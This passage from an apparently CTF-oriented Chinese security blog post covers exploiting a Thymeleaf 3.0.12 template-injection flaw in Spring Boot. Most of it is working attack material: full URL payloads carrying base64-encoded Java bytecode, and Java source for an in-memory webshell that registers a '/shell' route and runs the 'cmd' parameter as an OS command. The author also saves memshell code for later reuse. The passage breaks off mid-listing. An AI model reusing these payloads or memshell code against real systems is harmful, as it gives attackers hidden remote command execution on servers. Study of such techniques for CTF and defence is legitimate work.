class="hljs-type">String</span> <span class="hljs-variable">safecode</span> <span class="hljs-operator">=</span> Base64Utils.encodeToUrlSafeString(bytes);<br>System.out.println(safecode);<br></code></pre></td></tr></table></figure><p>payload 中包含[ ] 特殊字符,需要URL编码一下-&gt; %5B和%5D，或者payload里面的java.net.URL[0] 也可以用java.net.URL(“http”,”127.0.0.1”,”1.txt”)进行替代，这个随便写就行不影响。</p><p>最终的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/;/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAkwoABgBOCABPCgAGAFAIADAHAFEHAFIHAFMKAAUAVAoABwBVBwBWCAAyBwBXCgAFAFgHAFkIAFoKAA4AWwcAXAcAXQoAEQBeBwBfCgAUAGAKAAoATgoABwBhCABiBwBjCgAZAGQIAGUHAGYKAGcAaAoAZwBpCgBqAGsKABwAbAgAbQoAHABuCgAcAG8HAHAJAHEAcgoAJABzAQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAGHBhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA_TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABJMamF2YS9sYW5nL09iamVjdDsBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBSBwBXBwBjAQAQTWV0aG9kUGFyYW1ldGVycwEAPShMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAANjbWQBAApleGVjUmVzdWx0AQAKRXhjZXB0aW9ucwcAdAEAIlJ1bnRpbWVWaXNpYmxlUGFyYW1ldGVyQW5ub3RhdGlvbnMBADZMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RQYXJhbTsBAAV2YWx1ZQEAClNvdXJjZUZpbGUBACFTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsLmphdmEMACcAKAEADGluamVjdC1zdGFydAwAdQB2AQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAdwB4DAB5AHoBABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsAQAQamF2YS9sYW5nL1N0cmluZwwAewB4AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAAi8qDAAnAHwBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMACcAfQEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MACcAfgwAfwCAAQAOaW5qZWN0LXN1Y2Nlc3MBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACBACgBAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAggwAgwCEDACFAIYHAIcMAIgAiQwAJwCKAQACXEEMAIsAjAwAjQCOAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCPDACQAJEMACcAkgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBABFnZXREZWNsYXJlZE1ldGhvZAEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEB9ihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0NvbnN1bWVzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RDb25kaXRpb247KVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWACEACgAGAAAAAAADAAEAJwAoAAEAKQAAAC8AAQABAAAABSq3AAGxAAAAAgAqAAAABgABAAAADAArAAAADAABAAAABQAsAC0AAAAJAC4ALwACACkAAAFZAAkABwAAAJQSAkwqtgADEgQGvQAFWQMSBlNZBBIGU1kFEgdTtgAITSwEtgAJEgoSCwS9AAVZAxIMU7YADU67AA5ZBL0ADFkDEg9TtwAQOgS7ABFZA70AErcAEzoFuwAUWRkEGQUBAQEBAbcAFToGLCoGvQAGWQMZBlNZBLsAClm3ABZTWQUtU7YAF1cSGEynAAtNLLYAGhIbTCuwAAEAAwCHAIoAGQADACoAAAA6AA4AAAAOAAMAEAAgABEAJQASADYAEwBIABQAVQAVAGcAFgCEABcAhwAbAIoAGACLABkAjwAaAJIAHAArAAAAUgAIACAAZwAwADEAAgA2AFEAMgAxAAMASAA_ADMANAAEAFUAMgA1ADYABQBnACAANwA4AAYAiwAHADkAOgACAAAAlAA7ADwAAAADAJEAPQA-AAEAPwAAABMAAv8AigACBwBABwBBAAEHAEIHAEMAAAAFAQA7AAAAAQAyAEQABAApAAAAaAAEAAMAAAAmuwAcWbgAHSu2AB62AB-3ACASIbYAIrYAI027ACRZLLIAJbcAJrAAAAACACoAAAAKAAIAAAAgABoAIQArAAAAIAADAAAAJgAsAC0AAAAAACYARQA-AAEAGgAMAEYAPgACAEcAAAAEAAEASABDAAAABQEARQAAAEkAAAAMAQABAEoAAQBLcwBFAAEATAAAAAIATQ==&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214230321805.png" alt="image-20241214230321805"></p><p><img src="https://cdn.clown2024.cn/image-20241214230307833.png" alt="image-20241214230307833"></p><h1 id="一题不出网的thymeleaf"><a href="#一题不出网的Thymeleaf" class="headerlink" title="一题不出网的Thymeleaf"></a>一题不出网的Thymeleaf</h1><p><img src="https://cdn.clown2024.cn/image-20241214230438476.png" alt="image-20241214230438476"></p><p>这题给的也是一个3.0.12的Thymeleaf，是一个路径拼接导致的漏洞</p><p>一开始我想着这不是直接秒了吗，发现内存马打不进去，打过去直接400了</p><p><img src="https://cdn.clown2024.cn/image-20241214230714610.png" alt="image-20241214230714610"></p><p>原因出在内存马这里，这题目的springboot版本比前面本地测试的要高，是2.7.5的版本，我们换到该版本，看一下本地打是什么报错</p><p><img src="https://cdn.clown2024.cn/image-20241214231157729.png" alt="image-20241214231157729"></p><p>然后去搜了搜发现不同版本的spring内存马是有差别的，查漏补缺了一下，不过似乎只是对controller有影响，参考文章：<a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p><p>前面的内存马是适合&lt;2.6.0版本的spring，2.6.0之后官方修改了url路径的默认匹配策略，需要重新构造内存马了，文章中的内存马形式</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>configField.setAccessible(<span class="hljs-literal">true</span>);<br>RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br></code></pre></td></tr></table></figure><p>根据这个把前面的内存马魔改一下，改成下面这样即可</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class&lt;?&gt; requestMappingHandlerMappingClass = requestMappingHandlerMapping.getClass();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> requestMappingHandlerMappingClass.getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshellChange.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><br>            registerMapping.invoke(requestMappingHandlerMapping, info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshellChange</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/admin?language=__$%7BT%20(org.springframework.cglib.core.ReflectUtils).defineClass(%22SpringRequestMappingMemshellChange%22,T%20(org.springframework.util.Base64Utils).decodeFromUrlSafeString(%22yv66vgAAADQAsAoACwBaCABbCgALAFwIADgKAAoAXQoAXgBfCgBeAGAHAGIIADwHAGMHAGQHAGUKAAoAZgoADABfBwBnCAA-BwBoCgAKAGkHAGoHAGsKABMAbAgAbQoAYQBuCwBvAHALAG8AcQoADwBaCgAMAHIIAHMHAHQKAB0AdQgAdgcAdwoAeAB5CgB4AHoKAHsAfAoAIAB9CAB-CgAgAH8KACAAgAcAgQkAggCDCgAoAIQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJExTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlOwEACGRvSW5qZWN0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBACFyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAEaW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAZAcAaAcAdAEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAIUBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAnU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbENoYW5nZS5qYXZhDAArACwBAAxpbmplY3Qtc3RhcnQMAIYAhwwAiACJBwCKDACLAIwMAI0AjgcAjwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kDACQAJEBACJTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsQ2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwAkgCRAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAArAJMBAAYvc2hlbGwMAJQAlgcAlwwAmACZDACaAJsMAJwAnQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAngAsAQAMaW5qZWN0LWVycm9yAQARamF2YS91dGlsL1NjYW5uZXIHAJ8MAKAAoQwAogCjBwCkDAClAKYMACsApwEAAlxBDACoAKkMAKoAqwEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcArAwArQCuDAArAK8BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8BAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAA8ACwAAAAAAAwABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAwALwAAAAwAAQAAAAUAMAAxAAAACQAyADMAAgAtAAABoQAHAAkAAACqEgJMKrYAA00sEgS2AAVOLQS2AAYtKrYAB8AACDoEKrYAAxIJBr0AClkDEgtTWQQSC1NZBRIMU7YADToFGQUEtgAOEg8SEAS9AApZAxIRU7YAEjoGuwATWQO9ABS3ABU6BwS9ABFZAxIWU7gAFxkEuQAYAgC5ABkBADoIGQUqBr0AC1kDGQhTWQS7AA9ZtwAaU1kFGQZTtgAbVxIcTKcAC00stgAeEh9MK7AAAQADAJ0AoAAdAAQALgAAAEYAEQAAAA4AAwAQAAgAEQAPABIAFAATAB4AFQA8ABYAQgAXAFQAGABhABoAewAcAJoAHQCdACEAoAAeAKEAHwClACAAqAAiAC8AAABmAAoACACVADQANQACAA8AjgA2ADcAAwAeAH8AOAA7AAQAPABhADwAPQAFAFQASQA-AD0ABgBhADwAPwBAAAcAewAiAEEAQgAIAKEABwBDAEQAAgAAAKoARQBGAAAAAwCnAEcASAABAEkAAAAMAAEACACVADQASgACAEsAAAATAAL_AKAAAgcATAcATQABBwBOBwBPAAAABQEARQAAAAEAPgBQAAQALQAAAGgABAADAAAAJrsAIFm4ACErtgAitgAjtwAkEiW2ACa2ACdNuwAoWSyyACm3ACqwAAAAAgAuAAAACgACAAAAJgAaACcALwAAACAAAwAAACYAMAAxAAAAAAAmAFEASAABABoADABSAEgAAgBTAAAABAABAFQATwAAAAUBAFEAAABVAAAADAEAAQBWAAEAV3MAUQACAFgAAAACAFkAOgAAABIAAgAIAGEAOQAJAG8AYQCVBgk=%22),nEw%20javax.management.loading.MLet(NeW%20java.net.URL(%22http%22,%22127.0.0.1%22,%221.txt%22),T%20(java.lang.Thread).currentThread().getContextClassLoader())).doInject(T%20(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(%22org.springframework.web.servlet.DispatcherServlet.CONTEXT%22,0).getBean(T%20(Class).forName(%22org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping%22)))%7D__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241215001523048.png" alt="image-20241215001523048"></p><p>然后访问&#x2F;shell路由cmd传参即可</p><p><img src="https://cdn.clown2024.cn/image-20241215001604905.png" alt="image-20241215001604905"></p><h2 id="spring内存马"><a href="#spring内存马" class="headerlink" title="spring内存马"></a>spring内存马</h2><p>这里顺便把文章的内存马记录一下，以后方便用</p><p><strong>&lt;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> 